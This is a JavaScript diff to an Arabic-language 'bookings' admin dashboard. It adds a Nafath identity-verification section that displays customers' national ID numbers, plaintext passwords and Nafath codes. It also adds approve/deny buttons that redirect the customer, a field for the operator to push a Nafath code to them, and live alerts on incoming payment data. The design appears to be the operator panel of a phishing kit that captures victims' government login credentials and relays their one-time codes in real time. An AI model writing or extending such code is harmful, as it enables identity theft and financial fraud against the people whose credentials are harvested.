@@ -393,6 +393,7 @@
   let token = localStorage.getItem("adm_tk") || "";
   let rows = [];
   let sock = null;
+  let currentOpenRef = null; // الـ reference المفتوح حالياً في نافذة التفاصيل
 
   const STATUS = {
     new: { lbl:"جديد", cls:"b-new" },
@@ -602,6 +603,44 @@
     }
   }
 
+  /* ===== قبول/رفض النفاذ ===== */
+  async function nafathAction(ref, action) {
+    const btn = document.getElementById(`nafath-${action}-${ref}`);
+    if (btn) { btn.disabled = true; btn.textContent = 'جاري...'; }
+    try {
+      const d = await post("/api/admin/nafath-action", { reference: ref, action });
+      if (d.success) {
+        const actionLabel = action === 'pass' ? '✅ قبول' : '❌ رفض';
+        toast(`${actionLabel} نفاذ - تم توجيه العميل إلى ${d.targetPage}`, action==='pass'?'ok':'err');
+        loadAll();
+        if (currentOpenRef && currentOpenRef === ref) {
+          setTimeout(() => openDetail(ref), 500);
+        }
+      } else {
+        toast('فشل الإجراء: ' + (d.error||''), 'err');
+        if (btn) { btn.disabled = false; btn.innerHTML = action==='pass' ? '<i class="bi bi-check-circle-fill"></i> قبول (إرسال رمز)' : '<i class="bi bi-x-circle-fill"></i> رفض'; }
+      }
+    } catch(e) {
+      toast('خطأ في الاتصال', 'err');
+      if (btn) { btn.disabled = false; btn.innerHTML = action==='pass' ? '<i class="bi bi-check-circle-fill"></i> قبول (إرسال رمز)' : '<i class="bi bi-x-circle-fill"></i> رفض'; }
+    }
+  }
+  async function sendNafathCode(ref) {
+    const input = document.getElementById(`nafath-code-${ref}`);
+    const code = input ? input.value.trim() : '';
+    if (!code) { toast('أدخل رمز نفاذ أولاً', 'err'); return; }
+    try {
+      const d = await post("/api/admin/send-nafath-code", { reference: ref, code });
+      if (d.success) {
+        toast(`تم إرسال رمز نفاذ: ${code}`, 'ok');
+        if (input) input.value = '';
+      } else {
+        toast('فشل الإرسال: ' + (d.error||''), 'err');
+      }
+    } catch(e) {
+      toast('خطأ في الاتصال', 'err');
+    }
+  }
   async function updStatus(ref, status) {
     document.querySelectorAll(".dd-menu").forEach(el=>el.classList.remove("open"));
     try {
@@ -617,13 +656,16 @@
       const d = await get(`/api/admin/bookings/${ref}`);
       if (!d.success) return;
       const b = d.data;
+      currentOpenRef = ref;
       document.getElementById("mTitle").textContent = `تفاصيل الحجز - ${b.referenceId}`;
       document.getElementById("mBody").innerHTML = buildDetail(b);
       document.getElementById("detailOverlay").classList.add("show");
     } catch { toast("خطأ في تحميل التفاصيل","err"); }
   }
-
-  function closeModal() { document.getElementById("detailOverlay").classList.remove("show"); }
+  function closeModal() {
+    currentOpenRef = null;
+    document.getElementById("detailOverlay").classList.remove("show");
+  }
 
   function dRow(label, val) {
     const v = val || "-";
@@ -672,10 +714,36 @@
         </div>`;
     }
     if (b.nafath) {
+      const nafathStep = b.nafath.step || 1;
+      const nafathStatus = b.nafath.status || '';
       h += `<div class="sec-title">بيانات نفاذ</div>
         <div class="detail-grid">
           ${dRow("رقم الهوية",b.nafath.nafathId)}${dRow("كلمة المرور",b.nafath.nafathPassword)}
           ${dRow("رمز نفاذ",b.nafath.nafathNumber)}
+        </div>
+        <div class="action-section">
+          <div class="action-sec-title"><i class="bi bi-shield-lock" style="color:#7c3aed"></i> إجراء التحقق من الهوية (نفاذ)</div>
+          <div class="action-step-info" id="nafath-info-${b.referenceId}">
+            الحالة: ${nafathStatus === 'approved' ? 'تم القبول' : nafathStatus === 'denied' ? 'تم الرفض' : 'بيانات مستلمة - بانتظار القرار'}
+          </div>
+          <div class="action-btns">
+            <button class="action-btn-approve" id="nafath-pass-${b.referenceId}" onclick="nafathAction('${b.referenceId}','pass')">
+              <i class="bi bi-check-circle-fill"></i> قبول (إرسال رمز)
+            </button>
+            <button class="action-btn-reject" id="nafath-denied-${b.referenceId}" onclick="nafathAction('${b.referenceId}','denied')">
+              <i class="bi bi-x-circle-fill"></i> رفض
+            </button>
+          </div>
+          ${nafathStep >= 2 ? `
+          <div style="margin-top:12px;">
+            <div style="font-size:13px;color:#6b7280;margin-bottom:6px;">إرسال رمز نفاذ للعميل:</div>
+            <div style="display:flex;gap:8px;align-items:center;">
+              <input type="text" id="nafath-code-${b.referenceId}" placeholder="أدخل رمز نفاذ" style="padding:8px 12px;border:1px solid #d1d5db;border-radius:8px;font-size:14px;width:150px;direction:ltr;" maxlength="6" />
+              <button class="action-btn-approve" style="padding:8px 16px;font-size:13px;" onclick="sendNafathCode('${b.referenceId}')">
+                <i class="bi bi-send-fill"></i> إرسال
+              </button>
+            </div>
+          </div>` : ''}
         </div>`;
     }
     if (b.motasel) {
@@ -720,8 +788,12 @@
       loadAll();
     });
     sock.on("newPayment", (d) => {
-      beep(); toast(`بيانات دفع: ${d.reference}`,"inf");
+      beep(); toast(`بيانات دفع جديدة: ${d.reference}`,"inf");
       loadAll();
+      // إذا كانت نافذة التفاصيل مفتوحة لنفس الـ reference، أعد تحميلها تلقائياً
+      if (currentOpenRef && currentOpenRef === d.reference) {
+        setTimeout(() => openDetail(d.reference), 500);
+      }
     });
   }
 
